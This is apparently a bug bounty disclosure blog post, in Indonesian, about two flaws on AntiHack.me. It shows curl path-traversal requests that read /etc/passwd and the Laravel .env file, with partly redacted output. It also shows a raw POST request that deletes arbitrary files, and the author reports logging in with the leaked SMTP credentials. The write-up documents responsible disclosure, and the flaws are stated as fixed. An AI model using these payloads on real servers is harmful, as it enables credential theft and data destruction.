@@ -1,0 +1,102 @@
+I"Ó<p><img src="/images/antihack_banner.png" alt="AntiHack.me" /></p>
+
+<p><strong>ABSTRACT</strong></p>
+
+<p>AntiHack.me merupakan sebuah situs <em>Bug Bounty Platform</em> asal Singapura. Melihat <em>Platform</em> ini cukup dikenal, maka saya memutuskan untuk membuat akun disana. Setelah berhasil membuat akun, user akan diberikan informasi terkait <em>Bug Bounty Program</em> yang terdapat di AntiHack, dan situs AntiHack sendiri masuk kedalam program tersebut.</p>
+
+<p><strong>VULNERABILITY I (Local File Disclosure)</strong></p>
+
+<p>Ketika mengakses laman https://www.antihack.me/blog, website akan menampilkan <em>Popup Modal</em> yang berisi ajakan untuk ikut berlangganan AntiHack Magazine, yaitu sebuah E-Zine yang dibuat oleh mereka. Prosesnya dengan memasukan beberapa informasi pada field yang disediakan, lalu menekan tombol Submit. Setelah tombol Submit ditekan, user akan diarahkan ke link untuk mendownload E-Zine tersebut.
+Berikut bentuk link nya:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.antihack.me/filedownload.php?file=AntiHACKJan19Issue.pdf
+</code></pre></div></div>
+
+<p>Dari struktur tersebut, dapat dilihat banwa file <strong>filedownload.php</strong> kemungkinan memiliki kerentanan Local File Disclosure, dimana dengan memanfaatkan file ini, kita dapat men-download file-file sensitif yang ada pada server.
+Percobaan pun dilakukan dengan bantuan curl.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[root@xhellc0de ~]# curl https://www.antihack.me/filedownload.php?file=../../../../etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+[ redacted ]
+
+</code></pre></div></div>
+
+<p>Dapat dilihat banwa benar file <strong>filedownload.php</strong> memiliki kerentanan sehingga kita dapat men-download file yang ada di server.
+Karena website AntiHack.me menggunakan Laravel, maka saya mencoba untuk memperoleh file config nya yaitu pada file .env</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[root@xhellc0de ~]# curl https://www.antihack.me/filedownload.php?file=../../../../var/www/html/.env
+
+[ redacted ]
+DB_CONNECTION=mysql
+DB_HOST=localhost
+DB_PORT=3306
+DB_DATABASE=antihack
+DB_USERNAME=antihack
+DB_PASSWORD=
+[ redacted ]
+
+MAIL_DRIVER=smtp
+MAIL_HOST=smtp.zoho.com
+MAIL_PORT=465
+MAIL_USERNAME=admin@antihack.me
+MAIL_PASSWORD=[ redacted ]
+MAIL_ENCRYPTION=ssl
+[ redacted ]
+</code></pre></div></div>
+
+<p>Dari informasi tersebut, kita memperoleh informasi sensitif seperti user dan password database. Bahkan terdapat user dan password SMTP yang digunakan.
+Saya mencoba login menggunakan user dan password SMTP yang diperoleh dan ternyata berhasil, hehe.</p>
+
+<p><img src="/images/antihack_zohopanel.png" alt="Zoho Panel" /></p>
+
+<p><strong>VULNERABILITY II (IDOR Delete Any File on AntiHack.me Server)</strong></p>
+
+<p>Seperti pada website <em>Bug Bounty</em> pada umumnya, terdapat sebuah fitur untuk melakukan reporting terkait vulnerability yang ditemukan. Tidak lupa pula terdapat fitur <em>attach file</em> untuk menambah file gambar atau video untuk melengkapi report yang kita kirimkan.
+Ketika kita selelai melakukan <em>upload file</em> pada form report, muncul sebuah tombol X yang berfungsi untuk menghapus file yang baru saja diupload, fungsi nya tentu saja untuk menghapus file bila kita salah meng-upload file report.</p>
+
+<p><img src="/images/antihack_removebutton.png" alt="Remove Button" /></p>
+
+<p>Ketika tombol tersebut diklik, berikut proses yang berjalan:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /php/ajax_remove_file.php HTTP/1.1
+Host: www.antihack.me
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://www.antihack.me/hacker_inbox
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 21
+Cookie: [ redacted ]
+Connection: close
+
+file=asu.png
+</code></pre></div></div>
+
+<p>Sayangnya tidak diterapkan validasi file apa saja yang boleh dihapus. Dengan memanipulasi nilai dari parameter <strong>file</strong> kita dapat menghapus file apapun yang terdapat pada server AntiHack.me.</p>
+
+<p>Untuk lebih jelasnya, silahkan lihat GIF berikut:</p>
+
+<p><img src="/images/antihack_me_remove.gif" alt="Remove" /></p>
+
+<p>Pada percobaanya saya mencoba menghapus file dengan beberapa ekstensi berbeda, namun tidak mencoba untuk menghapus file yang berada di luar folder website karna khawatir akan mengganggu bahkan merusak website tersebut.</p>
+
+<p>Itulah beberapa vulnerability yang berhasil ditemukan pada website AntiHack.me. Saat ini semua vulnerability tersebut sudah diperbaiki oleh pihak AntiHack.me.</p>
+
+<p><strong>Timeline</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2019-01-03: Bug reported
+2019-01-04: Triaged
+2019-01-06: Bug Fixed
+2019-01-09: Report Resolved
+2019-01-09: Swag Rewarded
+</code></pre></div></div>
+:ET
